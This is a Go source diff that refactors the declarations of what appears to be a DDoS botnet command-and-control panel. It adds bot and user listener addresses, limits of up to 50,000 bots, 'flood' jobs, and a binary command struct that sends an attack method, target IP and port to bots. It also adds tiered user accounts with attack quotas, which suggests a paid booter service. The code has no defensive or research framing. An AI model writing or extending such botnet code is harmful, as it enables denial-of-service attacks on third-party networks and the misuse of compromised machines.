@@ -8,16 +8,51 @@ import (
 	"github.com/golang-jwt/jwt/v4"
 )
 
-type rank int
-
 const (
-	rankOwner rank = iota
-	rankAdmin
-	rankPro
-	rankBasic
+	userFile = "data/json/users.json"
+	rbacFile = "data/json/rbac.json"
+	certPath = "data/certs/server.crt"
+	keyPath  = "data/certs/server.key"
+	jwtFile  = "data/certs/jwt_signing.key"
+	logDir   = "data/logs"
+	gifDir   = "data/gifs"
 )
 
-type account struct {
+const (
+	addrUser = "192.168.0.11:420"
+	addrBot  = "192.168.0.11:7002"
+	addrAPI  = "8443"
+)
+
+const (
+	termCols = 82
+	termRows = 26
+)
+
+const (
+	maxConns   = 1000
+	maxBots    = 50000
+	maxSess    = 10000
+	maxAuth    = 10000
+	maxQuota   = 1000
+	maxHist    = 10000
+	maxRL      = 50000
+	maxPool    = 1000
+	maxFlood   = 1000
+	maxAPIFlood = 1000
+	maxPerIP   = 5
+)
+
+type tier int
+
+const (
+	tierOwner tier = iota
+	tierAdmin
+	tierPro
+	tierBasic
+)
+
+type acct struct {
 	Username  string    `json:"username,omitempty"`
 	Password  string    `json:"password,omitempty"`
 	Expire    time.Time `json:"expire"`
@@ -26,20 +61,20 @@ type account struct {
 	APISecret string    `json:"api_secret,omitempty"`
 }
 
-func (a *account) rank() rank {
+func (a *acct) lvl() tier {
 	switch a.Level {
 	case "Owner":
-		return rankOwner
+		return tierOwner
 	case "Admin":
-		return rankAdmin
+		return tierAdmin
 	case "Pro":
-		return rankPro
+		return tierPro
 	default:
-		return rankBasic
+		return tierBasic
 	}
 }
 
-type attack struct {
+type flood struct {
 	method  string
 	target  string
 	port    string
@@ -48,7 +83,7 @@ type attack struct {
 	who     string
 }
 
-type cmdPayload struct {
+type cmd struct {
 	Method   [16]byte
 	TargetIP [4]byte
 	Port     uint16
@@ -56,7 +91,7 @@ type cmdPayload struct {
 	Pad      [16]byte
 }
 
-type sysInfo struct {
+type sysinfo struct {
 	OS     string `json:"os"`
 	Arch   string `json:"arch"`
 	CPU    string `json:"cpu,omitempty"`
@@ -68,19 +103,19 @@ type sysInfo struct {
 	Disk   string `json:"disk_usage,omitempty"`
 }
 
-type botEntry struct {
-	ID        string    `json:"id"`
-	IP        string    `json:"ip"`
-	ConnAt    time.Time `json:"connected"`
-	LastPing  time.Time `json:"last_ping"`
-	Status    string    `json:"status"`
-	PingMs    int64     `json:"ping_ms"`
-	Sys       sysInfo   `json:"system_info,omitempty"`
+type node struct {
+	ID       string    `json:"id"`
+	IP       string    `json:"ip"`
+	ConnAt   time.Time `json:"connected"`
+	LastPing time.Time `json:"last_ping"`
+	Status   string    `json:"status"`
+	PingMs   int64     `json:"ping_ms"`
+	Sys      sysinfo   `json:"system_info,omitempty"`
 }
 
-type sess struct {
+type session struct {
 	ID        string    `json:"id"`
-	User      account   `json:"user"`
+	User      acct      `json:"user"`
 	IP        string    `json:"ip"`
 	Agent     string    `json:"user_agent,omitempty"`
 	LoginAt   time.Time `json:"login_time"`
@@ -93,7 +128,7 @@ type sess struct {
 	mu        sync.Mutex
 }
 
-type jwtClaims struct {
+type claims struct {
 	SessID string `json:"session_id"`
 	UID    string `json:"user_id"`
 	Role   string `json:"user_level"`
@@ -101,13 +136,13 @@ type jwtClaims struct {
 	jwt.RegisteredClaims
 }
 
-type loginAttempt struct {
+type loginRec struct {
 	Count   int
 	LastTry time.Time
 	Lock    sync.Mutex
 }
 
-type quota struct {
+type qlimit struct {
 	MaxConcurrent int
 	MaxDaily      int
 	MaxDur        time.Duration
@@ -115,14 +150,27 @@ type quota struct {
 	ResetAt       time.Time
 }
 
-type anim struct {
+type animation struct {
 	frames []string
 	delay  time.Duration
 }
 
-type userConn struct {
+type client struct {
 	conn  net.Conn
-	acct  account
+	user  acct
 	token string
 	sid   string
+}
+
+func parseTier(s string) tier {
+	switch s {
+	case "Owner":
+		return tierOwner
+	case "Admin":
+		return tierAdmin
+	case "Pro":
+		return tierPro
+	default:
+		return tierBasic
+	}
 }
